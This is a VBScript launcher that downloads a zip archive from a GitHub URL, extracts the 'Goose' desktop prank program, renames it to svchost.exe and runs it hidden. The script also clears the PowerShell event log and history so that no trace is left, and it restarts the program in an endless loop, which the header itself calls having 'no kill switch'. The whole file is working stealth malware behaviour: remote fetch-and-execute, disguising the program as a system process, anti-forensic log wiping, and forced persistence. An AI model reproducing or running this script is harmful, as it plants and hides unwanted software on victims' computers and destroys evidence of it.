' Self-contained stealth Goose launcher with no kill switch

Dim shell, fso, tempPath, zipPath, extractPath, exePath, psCommand
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

tempPath = shell.ExpandEnvironmentStrings("%TEMP%")
zipPath = tempPath & "\IGoose.zip"
extractPath = tempPath & "\IGooseExtracted"
exePath = extractPath & "\svchost.exe"

' Download the Goose zip archive
Dim http
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", "https://github.com/Akeydeys/In/raw/main/Birth%20Goose.zip", False
http.Send

If http.Status = 200 Then
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' Binary
    stream.Open
    stream.Write http.responseBody
    stream.SaveToFile zipPath, 2 ' Overwrite if exists
    stream.Close
End If

' Extract the zip archive
Dim shellApp
Set shellApp = CreateObject("Shell.Application")
shellApp.NameSpace(extractPath).CopyHere shellApp.NameSpace(zipPath).Items

' Wait for extraction to complete
WScript.Sleep 3000

' Rename GooseDesktop.exe to svchost.exe
Dim originalExe
originalExe = extractPath & "\GooseDesktop.exe"
If fso.FileExists(originalExe) Then
    fso.MoveFile originalExe, exePath
End If

' Start the renamed executable
shell.Run """" & exePath & """", 0, False

' One-time log cleanup
On Error Resume Next
shell.Run "powershell -Command ""try { if (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) { wevtutil cl 'Microsoft-Windows-PowerShell/Operational' } } catch {}""", 0, False

' Monitor the process and restart if it stops
Do
    WScript.Sleep 3000
    Dim processes, process, found
    Set processes = GetObject("winmgmts:").ExecQuery("Select * from Win32_Process Where Name='svchost.exe'")
    found = False
    For Each process In processes
        If InStr(process.CommandLine, "IGooseExtracted") > 0 Then
            found = True
            Exit For
        End If
    Next

    If Not found Then
        shell.Run """" & exePath & """", 0, False
        ' Clear PowerShell history
        shell.Run "powershell -Command ""try { Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue } catch {}""", 0, False
        ' Clear PowerShell event logs
        shell.Run "powershell -Command ""try { if (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) { wevtutil cl 'Microsoft-Windows-PowerShell/Operational' } } catch {}""", 0, False
    End If
Loop
